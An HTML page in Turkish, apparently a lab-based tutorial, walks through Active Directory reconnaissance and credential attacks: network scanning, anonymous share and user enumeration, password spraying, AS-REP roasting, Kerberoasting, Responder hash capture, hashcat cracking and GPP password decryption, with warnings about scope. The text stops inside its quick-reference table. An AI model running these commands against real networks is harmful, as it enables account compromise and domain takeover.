@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Active Directory İlk Keşif</title>
+<style>
+  :root{
+    --bg:#0d1117; --panel:#161b22; --panel2:#1c2530; --border:#2b3648;
+    --text:#e6edf3; --muted:#8b98a9; --accent:#58a6ff; --accent2:#7ee787;
+    --warn:#f0883e; --danger:#f85149; --cmd-bg:#0a0e14; --chip:#21324a;
+    --gold:#e3b341;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  body{
+    background:var(--bg); color:var(--text);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    line-height:1.6; padding-bottom:60px;
+  }
+  .wrap{max-width:1150px;margin:0 auto;padding:0 20px}
+
+  header{
+    background:linear-gradient(135deg,#0d1117 0%,#161b22 60%,#1a2436 100%);
+    border-bottom:1px solid var(--border); padding:44px 0 34px; text-align:center;
+  }
+  header h1{font-size:2.3rem;letter-spacing:-.5px;margin-bottom:8px}
+  header h1 span{color:var(--accent)}
+  header p{color:var(--muted);max-width:760px;margin:0 auto;font-size:1.02rem}
+  .lab-box{
+    display:inline-flex;flex-wrap:wrap;gap:18px;margin-top:22px;
+    background:var(--panel2);border:1px solid var(--border);border-radius:10px;
+    padding:14px 22px;font-family:"Consolas",monospace;font-size:.9rem
+  }
+  .lab-box b{color:var(--accent2)}
+  .lab-box .muted{color:var(--muted)}
+
+  .toc{
+    background:var(--panel); border:1px solid var(--border); border-radius:12px;
+    padding:20px 24px; margin:28px 0;
+  }
+  .toc h2{font-size:1rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:14px}
+  .toc-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:8px}
+  .toc-grid a{
+    color:var(--text);text-decoration:none;font-size:.9rem;padding:8px 11px;border-radius:7px;
+    background:var(--panel2);border:1px solid transparent;transition:.15s;display:flex;gap:9px;align-items:center
+  }
+  .toc-grid a:hover{border-color:var(--accent);color:var(--accent)}
+  .toc-grid a .n{color:var(--gold);font-weight:700;font-family:monospace;min-width:22px}
+
+  .mindset{
+    background:var(--panel);border:1px solid var(--border);border-radius:12px;
+    padding:24px 26px;margin:28px 0
+  }
+  .mindset h2{margin-bottom:14px;font-size:1.3rem}
+  .mindset h2 .em{color:var(--accent)}
+  .mindset p{color:#c9d3de;margin-bottom:8px}
+  .chain{
+    display:flex;flex-wrap:wrap;gap:8px;margin-top:14px;font-family:monospace;font-size:.86rem
+  }
+  .chain span{
+    background:var(--chip);border:1px solid var(--border);border-radius:20px;padding:5px 13px;color:var(--accent2)
+  }
+  .chain .arrow{background:none;border:none;color:var(--muted);padding:5px 2px}
+
+  .step-card{
+    background:var(--panel);border:1px solid var(--border);border-radius:12px;
+    margin:22px 0;overflow:hidden;scroll-margin-top:20px
+  }
+  .step-head{
+    display:flex;align-items:center;gap:14px;padding:18px 24px;
+    background:linear-gradient(90deg,var(--panel2),var(--panel));border-bottom:1px solid var(--border)
+  }
+  .step-head .num{
+    font-family:monospace;font-weight:700;font-size:1.1rem;color:var(--gold);
+    background:var(--chip);border-radius:8px;padding:5px 12px;min-width:44px;text-align:center
+  }
+  .step-head h3{font-size:1.32rem;flex:1}
+  .step-head .badge{
+    font-size:.72rem;padding:3px 10px;border-radius:20px;font-weight:600;
+    text-transform:uppercase;letter-spacing:.5px;background:#1f3a5f;color:#79c0ff
+  }
+  .step-body{padding:22px 24px}
+  .step-body>p{color:#c9d3de;margin-bottom:10px}
+  .goal{
+    background:#0f2233;border:1px solid #1f4a6d;border-radius:8px;padding:11px 14px;margin:0 0 16px;
+    font-size:.92rem;color:#9fd0ff
+  }
+  .goal::before{content:"🎯 Amaç: ";font-weight:700;color:var(--accent)}
+  .step-body h4{
+    font-size:.82rem;text-transform:uppercase;letter-spacing:1px;color:var(--accent);
+    margin:20px 0 8px;display:flex;align-items:center;gap:8px
+  }
+  .step-body h4:first-of-type{margin-top:6px}
+  .toolname{color:var(--gold);font-weight:700}
+  .step-body ul{margin:6px 0 6px 22px;color:#c9d3de}
+  .step-body li{margin:4px 0}
+
+  pre{
+    background:var(--cmd-bg);border:1px solid var(--border);border-left:3px solid var(--accent2);
+    border-radius:8px;padding:14px 16px;overflow-x:auto;margin:8px 0
+  }
+  code{font-family:"Consolas","Courier New",monospace;font-size:.87rem;color:#e6edf3}
+  .cmt{color:#6a7684}
+  .str{color:#a5d6ff}
+  .out{color:#7ee787}
+  .tip{background:#12281c;border:1px solid #1f5133;border-radius:8px;padding:12px 14px;margin:10px 0;font-size:.9rem;color:#ade2be}
+  .tip::before{content:"💡 ";}
+  .warnbox{background:#2a1a12;border:1px solid #5c3418;border-radius:8px;padding:12px 14px;margin:10px 0;font-size:.9rem;color:#f0c197}
+  .warnbox::before{content:"⚠️ ";}
+  .note{background:var(--panel2);border:1px dashed var(--border);border-radius:8px;padding:12px 14px;margin:10px 0;font-size:.88rem}
+  .note b{color:var(--gold)}
+
+  .cheat{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:24px;margin:30px 0}
+  .cheat h2{margin-bottom:16px}
+  table{width:100%;border-collapse:collapse;font-size:.9rem}
+  th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--border);vertical-align:top}
+  th{color:var(--muted);text-transform:uppercase;font-size:.75rem;letter-spacing:.5px}
+  td:first-child{color:var(--accent2);font-weight:600;white-space:nowrap}
+  tr:hover td{background:var(--panel2)}
+
+  footer{text-align:center;color:var(--muted);font-size:.85rem;margin-top:40px;padding-top:20px;border-top:1px solid var(--border)}
+  .backtop{
+    position:fixed;bottom:24px;right:24px;background:var(--accent);color:#04101f;
+    width:46px;height:46px;border-radius:50%;display:flex;align-items:center;justify-content:center;
+    text-decoration:none;font-size:1.4rem;box-shadow:0 4px 14px rgba(0,0,0,.4);z-index:50
+  }
+  @media(max-width:600px){header h1{font-size:1.6rem}.step-head h3{font-size:1.05rem}}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="wrap">
+    <h1><span>Active Directory</span> İlk Keşif</h1>
+    <p>Sıfırdan başlayan bilgi toplama (Enumeration) rehberi. Elinde <b>hiçbir bilgi yokken</b> — IP, domain adı, paylaşım, kullanıcı ve parolayı adım adım nasıl bulursun? Bir pentestin %80'i buradadır.</p>
+    <div class="lab-box">
+      <span><span class="muted">Örnek Domain:</span> <b>thm.loc</b></span>
+      <span><span class="muted">Örnek Kullanıcı:</span> <b>claire</b></span>
+      <span><span class="muted">Örnek Parola:</span> <b>Password123!</b></span>
+      <span><span class="muted">Örnek Share:</span> <b>SHARE1</b></span>
+      <span><span class="muted">Ağ:</span> <b>192.168.11.0/24</b></span>
+    </div>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <!-- MINDSET -->
+  <section class="mindset">
+    <h2>🧠 Keşif <span class="em">Zihniyeti</span></h2>
+    <p>Gerçek bir sızma testinde kimse sana IP, domain, kullanıcı adı ve parolayı altın tepside sunmaz. Bunları <b>sen toplarsın</b>. Mantık her zaman şu zincirdir: önce <b>ne var</b> (ağdaki hostlar), sonra <b>bu ne</b> (hangisi DC), sonra <b>bana ne söylüyor</b> (domain, kullanıcılar, paylaşımlar), en sonunda <b>nereye girebilirim</b> (parola/hash).</p>
+    <div class="chain">
+      <span>1 · IP / Host</span><span class="arrow">→</span>
+      <span>2 · Domain Adı</span><span class="arrow">→</span>
+      <span>3 · Paylaşımlar</span><span class="arrow">→</span>
+      <span>4 · Kullanıcılar</span><span class="arrow">→</span>
+      <span>5 · Parola / Hash</span><span class="arrow">→</span>
+      <span>6 · SPN Tespiti</span>
+    </div>
+    <div class="tip" style="margin-top:16px">Kural: Her adımın çıktısı bir sonraki adımın <b>girdisidir</b>. IP'yi bulmadan domain sorgulayamazsın, kullanıcıları bulmadan parola spraying yapamazsın. Sırayı bozma.</div>
+  </section>
+
+  <!-- TOC -->
+  <nav class="toc">
+    <h2>Keşif Adımları</h2>
+    <div class="toc-grid">
+      <a href="#s1"><span class="n">01</span> IP / Host Keşfi</a>
+      <a href="#s2"><span class="n">02</span> Domain Adı Tespiti</a>
+      <a href="#s3"><span class="n">03</span> Paylaşım (Share) Keşfi</a>
+      <a href="#s4"><span class="n">04</span> Kullanıcı Enumeration</a>
+      <a href="#s5"><span class="n">05</span> Parola / Hash Ele Geçirme</a>
+      <a href="#s6"><span class="n">06</span> SPN Tespiti</a>
+      <a href="#s7"><span class="n">07</span> Ek Keşif Araçları</a>
+      <a href="#cheat"><span class="n">★</span> Hızlı Referans</a>
+    </div>
+  </nav>
+
+  <!-- ============ STEP 1 — IP / HOST ============ -->
+  <article class="step-card" id="s1">
+    <div class="step-head"><span class="num">01</span><h3>IP / Host Keşfi</h3><span class="badge">Host Discovery</span></div>
+    <div class="step-body">
+      <div class="goal">Ağda hangi cihazlar ayakta? Hangisi Domain Controller (DC), hangisi normal sunucu/istemci?</div>
+      <p>Ağa fiziksel ya da VPN ile bağlandın. Elinde sadece bir ağ bloğu var (örn. <code>192.168.11.0/24</code>). Önce canlı hostları bul, sonra portlarına bakarak <b>DC'yi</b> ayıkla.</p>
+
+      <h4>🔧 <span class="toolname">nmap</span> — canlı host + port keşfi</h4>
+      <pre><code><span class="cmt"># 1) Ağda kim ayakta? (ping sweep, DNS çözümleme kapalı)</span>
+nmap -sn -n 192.168.11.0/24
+
+<span class="cmt"># 2) DC avı: 88(Kerberos)+389(LDAP)+445(SMB) açık hostları bul</span>
+nmap -Pn -p 88,389,445 --open -T4 192.168.11.0/24
+
+<span class="cmt"># 3) Bulunan hedefte servis/versiyon + tüm AD portları</span>
+nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268,3269 192.168.11.51
+
+<span class="cmt"># 4) Sonuçları 3 formatta kaydet (rapor için)</span>
+nmap -Pn -p 88,389,445 --open -oA kesif_hosts 192.168.11.0/24</code></pre>
+      <div class="tip"><code>88/tcp kerberos-sec</code> + <code>389/tcp ldap</code> + <code>445/tcp microsoft-ds</code> üçlüsünü gördüğün IP → büyük ihtimalle <b>Domain Controller</b>.</div>
+
+      <h4>🔧 <span class="toolname">arp-scan / netdiscover</span> — Layer-2 keşif (en güvenilir yerel ağda)</h4>
+      <pre><code><span class="cmt"># ARP ile yerel ağdaki tüm cihazları listele (MAC + IP)</span>
+sudo arp-scan --localnet
+sudo arp-scan -I eth0 192.168.11.0/24
+
+<span class="cmt"># Pasif/aktif keşif (netdiscover)</span>
+sudo netdiscover -r 192.168.11.0/24
+sudo netdiscover -p            <span class="cmt"># tamamen pasif dinleme (sessiz)</span></code></pre>
+      <div class="note"><b>Neden ARP?</b> Firewall ICMP (ping) engelliyorsa nmap <code>-sn</code> host'u kaçırabilir. ARP ise aynı ağ segmentinde her cihazı görür — atlanmaz.</div>
+
+      <h4>🔧 <span class="toolname">fping / nbtscan</span> — hızlı alternatifler</h4>
+      <pre><code>fping -a -g 192.168.11.0/24 2&gt;/dev/null      <span class="cmt"># canlı IP listesi</span>
+sudo nbtscan 192.168.11.0/24                 <span class="cmt"># NetBIOS isim + domain/workgroup</span></code></pre>
+    </div>
+  </article>
+
+  <!-- ============ STEP 2 — DOMAIN ============ -->
+  <article class="step-card" id="s2">
+    <div class="step-head"><span class="num">02</span><h3>Domain Adı Tespiti</h3><span class="badge">Domain Enum</span></div>
+    <div class="step-body">
+      <div class="goal">Bu makineler hangi domain'e bağlı? (örn. <code>thm.loc</code>) — FQDN ve DC host adını öğren.</div>
+      <p>IP'yi bulduktan sonra hedef sana domain adını genelde <b>kendisi sızdırır</b>. SMB, LDAP ve NetBIOS servisleri domain adını kimlik doğrulamadan bile verebilir.</p>
+
+      <h4>🔧 <span class="toolname">nmap smb-os-discovery</span> — en hızlı yol</h4>
+      <pre><code>nmap -p 445 --script smb-os-discovery 192.168.11.51
+
+<span class="cmt"># Örnek çıktı:</span>
+<span class="out">| smb-os-discovery:
+|   OS: Windows Server 2019
+|   Computer name: DC01
+|   Domain name: thm.loc
+|   Forest name: thm.loc
+|   FQDN: DC01.thm.loc</span></code></pre>
+      <div class="tip">Domain adını <code>Domain name:</code> satırında <b>kabak gibi</b> verir. FQDN'i (<code>DC01.thm.loc</code>) not al — Kerberos komutlarında lazım olacak.</div>
+
+      <h4>🔧 <span class="toolname">NetExec (nxc)</span> — tek satırda domain + host bilgisi</h4>
+      <pre><code><span class="cmt"># Kimliksiz SMB: hostname, domain, signing, OS versiyonu</span>
+nxc smb 192.168.11.51
+
+<span class="cmt"># Örnek çıktı: SMB  192.168.11.51  445  DC01  [*] Windows 10/Server 2019</span>
+<span class="cmt">#             Build 17763 (name:DC01) (domain:thm.loc) (signing:True)</span>
+
+<span class="cmt"># LDAP üzerinden domain/naming context</span>
+nxc ldap 192.168.11.51</code></pre>
+
+      <h4>🔧 <span class="toolname">ldapsearch</span> — anonim rootDSE sorgusu</h4>
+      <pre><code><span class="cmt"># Kimliksiz: defaultNamingContext = DC=thm,DC=loc</span>
+ldapsearch -x -H ldap://192.168.11.51 -s base -b "" \
+  defaultNamingContext dnsHostName serverName</code></pre>
+
+      <h4>🔧 <span class="toolname">enum4linux-ng / rpcclient</span> — NetBIOS + domain SID</h4>
+      <pre><code>enum4linux-ng -A 192.168.11.51 | grep -iE 'domain|fqdn'
+
+<span class="cmt"># rpcclient (null session) ile domain bilgisi ve SID</span>
+rpcclient -U "" -N 192.168.11.51 -c 'querydominfo;lsaquery'</code></pre>
+
+      <h4>🔧 <span class="toolname">Responder</span> — pasif dinleme (domain adı yakalama)</h4>
+      <pre><code><span class="cmt"># Sadece dinle (-A analiz modu) — cevap verme, domain trafiğini gör</span>
+sudo responder -I eth0 -A</code></pre>
+      <div class="note"><b>DNS ayarı:</b> Domain adını öğrendikten sonra <code>/etc/resolv.conf</code>'a DC'yi DNS olarak ekle (<code>nameserver 192.168.11.51</code>) — Kerberos/LDAP araçları FQDN çözebilsin.</div>
+    </div>
+  </article>
+
+  <!-- ============ STEP 3 — SHARES ============ -->
+  <article class="step-card" id="s3">
+    <div class="step-head"><span class="num">03</span><h3>Paylaşım (Share) Keşfi</h3><span class="badge">SMB Enum</span></div>
+    <div class="step-body">
+      <div class="goal">Hangi klasörler paylaşıma açık? (örn. <code>SHARE1</code>) — anonim erişilebilen ("Null Session") paylaşım var mı?</div>
+      <p>Sisteme kullanıcı/parola vermeden ("Null Session") paylaşımları listelemeyi dene. Yönetici anonim erişimi kapatmayı unuttuysa <code>SHARE1</code>, <code>IPC$</code>, <code>SYSVOL</code> gibi paylaşımlar önüne dökülür.</p>
+
+      <h4>🔧 <span class="toolname">smbclient</span> — şifresiz listeleme</h4>
+      <pre><code><span class="cmt"># -N = No Pass (şifresiz / anonim listeleme)</span>
+smbclient -L //192.168.11.51 -N
+
+<span class="cmt"># Örnek çıktı:</span>
+<span class="out">        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        SHARE1          Disk      Şirket paylaşımı
+        SYSVOL          Disk      Logon server share</span>
+
+<span class="cmt"># Bulunan share'e anonim bağlan ve içine bak</span>
+smbclient //192.168.11.51/SHARE1 -N
+smb: \&gt; ls
+smb: \&gt; recurse ON; prompt OFF; mget *   <span class="cmt"># tüm içeriği indir</span></code></pre>
+
+      <h4>🔧 <span class="toolname">NetExec</span> — share'ler + okuma/yazma yetkisi</h4>
+      <pre><code><span class="cmt"># Anonim / guest ile paylaşımları ve READ/WRITE yetkilerini gör</span>
+nxc smb 192.168.11.51 -u '' -p '' --shares
+nxc smb 192.168.11.51 -u 'guest' -p '' --shares
+
+<span class="cmt"># Kimlik bulduktan sonra: içerikte otomatik dosya arama</span>
+nxc smb 192.168.11.51 -u claire -p 'Password123!' -M spider_plus</code></pre>
+
+      <h4>🔧 <span class="toolname">smbmap</span> — yetki matrisi + içerik arama</h4>
+      <pre><code><span class="cmt"># Tüm share'lerde yetki (READ/WRITE) matrisi, özyinelemeli</span>
+smbmap -H 192.168.11.51 -u '' -p '' -R --depth 5
+
+<span class="cmt"># İçerikte hassas dosya deseni ara (parola/config)</span>
+smbmap -H 192.168.11.51 -u claire -p 'Password123!' \
+  -A '.*\.(txt|xml|ini|config|kdbx)'</code></pre>
+
+      <h4>🔧 <span class="toolname">enum4linux-ng</span> — share + tüm SMB bilgisi bir arada</h4>
+      <pre><code>enum4linux-ng -S 192.168.11.51        <span class="cmt"># sadece shares</span>
+enum4linux-ng -A 192.168.11.51        <span class="cmt"># hepsi (users/groups/shares/policy)</span></code></pre>
+      <div class="tip">AD'de özellikle <b>SYSVOL</b> ve <b>NETLOGON</b> altın değerindedir — GPP parolaları (<code>Groups.xml</code> içinde <code>cpassword</code>), logon scriptleri ve config dosyaları burada bulunabilir.</div>
+      <pre><code><span class="cmt"># SYSVOL'de GPP cpassword araması (indirdikten sonra)</span>
+grep -rniE 'cpassword|password' ./sysvol_dump/ 2&gt;/dev/null
+<span class="cmt"># Bulunan cpassword'ü çöz:</span>
+gpp-decrypt "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"</code></pre>
+    </div>
+  </article>
+
+  <!-- ============ STEP 4 — USERS ============ -->
+  <article class="step-card" id="s4">
+    <div class="step-head"><span class="num">04</span><h3>Kullanıcı Enumeration</h3><span class="badge">User Enum</span></div>
+    <div class="step-body">
+      <div class="goal">Sistemde hangi geçerli kullanıcı adları var? (örn. <code>claire</code>, <code>administrator</code>, <code>john</code>)</div>
+      <p>Geçerli kullanıcı listesi, parola saldırılarının hammaddesidir. RPC/LDAP anonim açıksa liste doğrudan gelir; değilse Kerberos ile bir kelime listesini "bu kullanıcı var mı?" diye sorarsın.</p>
+
+      <h4>🔧 <span class="toolname">rpcclient</span> — null session ile tüm kullanıcılar</h4>
+      <pre><code><span class="cmt"># Anonim bağlan + kullanıcıları listele</span>
+rpcclient -U "" -N 192.168.11.51 -c 'enumdomusers'
+
+<span class="cmt"># Örnek çıktı:</span>
+<span class="out">user:[Administrator] rid:[0x1f4]
+user:[claire]        rid:[0x452]
+user:[john]          rid:[0x453]</span>
+
+<span class="cmt"># Grupları ve tek kullanıcı detayını da çek</span>
+rpcclient -U "" -N 192.168.11.51 -c 'enumdomgroups'
+rpcclient -U "" -N 192.168.11.51 -c 'queryuser 0x452'</code></pre>
+
+      <h4>🔧 <span class="toolname">NetExec</span> — RID brute + kullanıcı listesi</h4>
+      <pre><code><span class="cmt"># Anonim RID brute (null session kullanıcı bulma)</span>
+nxc smb 192.168.11.51 -u '' -p '' --rid-brute 10000
+
+<span class="cmt"># Kimlikli: domain kullanıcılarını çek + parola politikası</span>
+nxc smb 192.168.11.51 -u claire -p 'Password123!' --users
+nxc smb 192.168.11.51 -u claire -p 'Password123!' --pass-pol</code></pre>
+
+      <h4>🔧 <span class="toolname">Kerbrute</span> — Kerberos ile kullanıcı doğrulama (auth'suz)</h4>
+      <pre><code><span class="cmt"># Bir isim listesinden hangileri GERÇEK kullanıcı? (çok sessiz)</span>
+kerbrute userenum -d thm.loc --dc 192.168.11.51 users.txt
+
+<span class="cmt"># Geçerli olanları dosyaya yaz</span>
+kerbrute userenum -d thm.loc --dc 192.168.11.51 -o gecerli_kullanicilar.txt users.txt</code></pre>
+      <div class="note"><b>Neden çalışır?</b> Kerberos, var olmayan kullanıcıya <code>PRINCIPAL_UNKNOWN</code>, var olan kullanıcıya farklı bir hata döner. Bu fark "kullanıcı gerçek mi?" sorusunu parola denemeden yanıtlar.</div>
+
+      <h4>🔧 <span class="toolname">enum4linux-ng / ldapsearch</span> — alternatif kaynaklar</h4>
+      <pre><code>enum4linux-ng -U 192.168.11.51        <span class="cmt"># users (SMB/RPC)</span>
+
+<span class="cmt"># LDAP kimlik varsa: sadece sAMAccountName çek</span>
+ldapsearch -x -LLL -H ldap://192.168.11.51 -D 'claire@thm.loc' -w 'Password123!' \
+  -b 'DC=thm,DC=loc' '(&amp;(objectCategory=person)(objectClass=user))' sAMAccountName</code></pre>
+
+      <h4>💼 OSINT — teknik olmayan yol</h4>
+      <ul>
+        <li>Şirketin <b>LinkedIn</b> sayfasından çalışan isimlerini topla.</li>
+        <li>E-posta formatını tahmin et (genelde <code>isim.soyisim</code> veya <code>ilkharf+soyisim</code>).</li>
+        <li><code>username-anarchy</code> ile isimlerden kullanıcı adı listesi üret:</li>
+      </ul>
+      <pre><code>username-anarchy -i isimler.txt &gt; users.txt
+<span class="cmt"># Claire Smith → claire, csmith, claire.smith, smithc ...</span></code></pre>
+    </div>
+  </article>
+
+  <!-- ============ STEP 5 — PASSWORD ============ -->
+  <article class="step-card" id="s5">
+    <div class="step-head"><span class="num">05</span><h3>Parola / Hash Ele Geçirme</h3><span class="badge">Credential Access</span></div>
+    <div class="step-body">
+      <div class="goal">Geçerli bir kullanıcının parolasını veya kırılabilir hash'ini ele geçir (örn. <code>claire : Password123!</code>).</div>
+      <p>Elinde kullanıcı listesi var. Şimdi bir parola bul. Birden fazla yol var — en az gürültülüsünden başla (lockout riskine dikkat!).</p>
+
+      <h4>🔧 <span class="toolname">Password Spraying</span> — az parola, çok kullanıcı</h4>
+      <pre><code><span class="cmt"># TEK parolayı TÜM kullanıcılara dene (lockout'a karşı güvenli yön)</span>
+nxc smb 192.168.11.51 -u users.txt -p 'Password123!' --continue-on-success
+
+<span class="cmt"># Kerbrute ile (Kerberos üzerinden, --safe = eşik koruması)</span>
+kerbrute passwordspray -d thm.loc --dc 192.168.11.51 users.txt 'Sonbahar2026!' --safe
+
+<span class="cmt"># Mevsim/yıl/şirket kalıpları en sık tutan zayıf parolalardır:</span>
+<span class="cmt"># Password123!  Sirket2026!  Summer2026!  Welcome1</span></code></pre>
+      <div class="warnbox">Spraying <b>aktif</b> müdahaledir ve hesap kilitleyebilir. Önce parola politikasını (<code>--pass-pol</code>) öğren: lockout threshold kaç? observation window ne kadar? Deneme sayısını eşiğin altında tut, denemeler arasına bekleme koy.</div>
+
+      <h4>🔧 <span class="toolname">AS-REP Roasting</span> — pre-auth kapalı hesaplar</h4>
+      <pre><code><span class="cmt"># Ön kimlik doğrulaması kapalı kullanıcıların hash'ini çek (parola gerekmez!)</span>
+impacket-GetNPUsers thm.loc/ -usersfile users.txt -dc-ip 192.168.11.51 \
+  -no-pass -format hashcat -outputfile asrep.hash
+
+<span class="cmt"># Hashcat ile kır (mod 18200)</span>
+hashcat -m 18200 asrep.hash rockyou.txt</code></pre>
+
+      <h4>🔧 <span class="toolname">Kerberoasting</span> — servis hesabı biletleri (kimlik gerekir)</h4>
+      <pre><code><span class="cmt"># SPN'li hesapların TGS biletini çek</span>
+impacket-GetUserSPNs thm.loc/claire:'Password123!' -dc-ip 192.168.11.51 \
+  -request -outputfile kerberoast.hash
+
+<span class="cmt"># Hashcat ile kır (mod 13100)</span>
+hashcat -m 13100 kerberoast.hash rockyou.txt</code></pre>
+
+      <h4>🔧 <span class="toolname">Responder</span> — LLMNR/NBT-NS zehirleme ile NTLM hash yakalama</h4>
+      <pre><code><span class="cmt"># AKTİF mod: sahte sunucu gibi davran, NTLMv2 hash yakala</span>
+sudo responder -I eth0
+
+<span class="cmt"># Yakalanan hash → hashcat mod 5600</span>
+hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt rockyou.txt</code></pre>
+      <div class="warnbox">Responder aktif modu ve hash kırma <b>aktif müdahaledir</b>. Yalnızca yazılı kapsam (scope) içinde çalıştır.</div>
+
+      <h4>🔧 Bulduğun credential'ı doğrula</h4>
+      <pre><code><span class="cmt"># "(Pwn3d!)" çıktısı = bu hostta yönetici demektir</span>
+nxc smb 192.168.11.51 -u claire -p 'Password123!'
+nxc smb 192.168.11.0/24 -u claire -p 'Password123!'   <span class="cmt"># nerelere giriyor?</span></code></pre>
+    </div>
+  </article>
+
+  <!-- ============ STEP 6 — SPN ============ -->
+  <article class="step-card" id="s6">
+    <div class="step-head"><span class="num">06</span><h3>SPN Tespiti</h3><span class="badge">Kerberoast Hazırlık</span></div>
+    <div class="step-body">
+      <div class="goal">Kerberoasting'e uygun <b>SPN (Service Principal Name)</b> tanımlı hesapları bul — bunlar servis hesabıdır ve çoğu zaman yüksek yetkilidir.</div>
+      <p>SPN, bir servisin (MSSQL, HTTP, CIFS...) hangi hesapla çalıştığını Kerberos'a tanıtan etikettir. <code>servicePrincipalName</code> dolu olan <b>kullanıcı hesapları</b> Kerberoasting adayıdır — biletlerini çekip offline kırabilirsin.</p>
+
+      <h4>🔧 <span class="toolname">impacket-GetUserSPNs</span> — en yaygın yol</h4>
+      <pre><code><span class="cmt"># Sadece SPN'li hesapları LİSTELE (bilet isteme, önce keşif)</span>
+impacket-GetUserSPNs thm.loc/claire:'Password123!' -dc-ip 192.168.11.51
+
+<span class="cmt"># Örnek çıktı:</span>
+<span class="out">ServicePrincipalName        Name       MemberOf
+--------------------------  ---------  ---------------------------
+MSSQLSvc/sql01.thm.loc:1433 sqlsvc     CN=Domain Admins,...
+HTTP/web01.thm.loc          websvc</span>
+
+<span class="cmt"># Tek hedefin biletini iste (-request-user)</span>
+impacket-GetUserSPNs thm.loc/claire:'Password123!' -dc-ip 192.168.11.51 \
+  -request-user sqlsvc</code></pre>
+
+      <h4>🔧 <span class="toolname">ldapsearch</span> — ham LDAP ile SPN listesi (auth'lu)</h4>
+      <pre><code><span class="cmt"># servicePrincipalName tanımlı KULLANICI hesapları (bilgisayarları hariç tut)</span>
+ldapsearch -x -LLL -H ldap://192.168.11.51 -D 'claire@thm.loc' -w 'Password123!' \
+  -b 'DC=thm,DC=loc' \
+  '(&amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' \
+  sAMAccountName servicePrincipalName</code></pre>
+
+      <h4>🔧 <span class="toolname">NetExec</span> — tek komutla SPN çek + roast</h4>
+      <pre><code>nxc ldap 192.168.11.51 -u claire -p 'Password123!' --kerberoasting kerb.txt
+
+<span class="cmt"># AS-REP roastable hesapları da aynı anda:</span>
+nxc ldap 192.168.11.51 -u claire -p 'Password123!' --asreproast asrep.txt</code></pre>
+
+      <h4>🔧 <span class="toolname">PowerView</span> — Windows tarafından (domain'e bağlı makinede)</h4>
+      <pre><code>Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname
+Get-NetUser -SPN | select samaccountname,serviceprincipalname</code></pre>
+      <div class="tip">SPN'i <b>Domain Admins</b> üyesi bir servis hesabında görürsen (örnekteki <code>sqlsvc</code> gibi) — bileti kır, parola zayıfsa doğrudan domain yönetimine giden yolu bulmuş olursun.</div>
+    </div>
+  </article>
+
+  <!-- ============ STEP 7 — EXTRA TOOLS ============ -->
+  <article class="step-card" id="s7">
+    <div class="step-head"><span class="num">07</span><h3>Ek Keşif Araçları</h3><span class="badge">Bonus</span></div>
+    <div class="step-body">
+      <div class="goal">İlk keşfi zenginleştiren, otomatikleştiren ve haritalayan yardımcı araçlar.</div>
+
+      <h4>🔧 <span class="toolname">ldapdomaindump</span> — LDAP'tan otomatik envanter (HTML rapor)</h4>
+      <pre><code>ldapdomaindump ldap://192.168.11.51 -u 'thm.loc\claire' -p 'Password123!' -o ./dump
+<span class="cmt"># Çıktı: domain_users.html, domain_groups.html, domain_computers.html ...</span></code></pre>
+
+      <h4>🔧 <span class="toolname">bloodhound-python</span> — yetki ilişkilerini topla (Kali collector)</h4>
+      <pre><code>bloodhound-python -u claire -p 'Password123!' -d thm.loc -ns 192.168.11.51 -c All --zip
+<span class="cmt"># Üretilen .zip → BloodHound'a yükle → "Shortest Path to Domain Admins"</span></code></pre>
+
+      <h4>🔧 <span class="toolname">enum4linux-ng (tam mod)</span> — tek komutta özet</h4>
+      <pre><code>enum4linux-ng -A -oJ enum_out 192.168.11.51   <span class="cmt"># JSON çıktı da üretir</span></code></pre>
+
+      <h4>🔧 <span class="toolname">dig / nslookup / dnsrecon</span> — DNS üzerinden AD keşfi</h4>
+      <pre><code><span class="cmt"># DC'yi DNS SRV kayıtlarından bul (domain adını biliyorsan)</span>
+dig @192.168.11.51 _ldap._tcp.dc._msdcs.thm.loc SRV
+nslookup -type=SRV _kerberos._tcp.thm.loc 192.168.11.51
+
+<span class="cmt"># Otomatik: SRV + zone transfer denemesi</span>
+dnsrecon -d thm.loc -n 192.168.11.51 -t std,srv</code></pre>
+
+      <h4>🔧 <span class="toolname">Wireshark / tshark</span> — trafikten pasif bilgi</h4>
+      <pre><code><span class="cmt"># Kerberos auth eden kullanıcı adlarını canlı yakala</span>
+tshark -i eth0 -Y "kerberos.msg_type == 10" -T fields -e kerberos.CNameString</code></pre>
+    </div>
+  </article>
+
+  <!-- CHEAT -->
+  <section class="cheat" id="cheat">
+    <h2>📋 Hızlı Referans — "Neyi hangi araçla bulurum?"</h2>
+    <table>
+      <thead><tr><th>Aradığın Bilgi</th><th>Birincil Araç</th><th>Örnek Komut</th></tr></thead>
+      <tbody>
+        <tr><td>Canlı IP'ler</td><td>nmap / arp-scan</td><td><code>nmap -sn 192.168.11.0/24</code></td></tr>
+        <tr><td>DC tespiti</td><td>nmap</td><td><code>nmap -p 88,389,445 --open ...</code></td></tr>
+        <tr><td>Domain adı (thm.loc)</td><td>nmap / nxc</td><td><code>nmap -p445 --script smb-os-discovery ...</code></td></tr>
+        <tr><td>Paylaşımlar (SHARE1)</td><td>smbclient / nxc</td><td><code>smbclient -L //IP -N</code></td></tr>
+        <tr><td>Yetki matrisi</td><td>smbmap</td><td><code>smbmap -H IP -u '' -p '' -R</code></td></tr>
+        <tr><td>Kullanıcılar (claire)</td><td>rpcclient / kerbrute</td><td><code>rpcclient -U "" -N IP -c enumdomusers</code></td></tr>
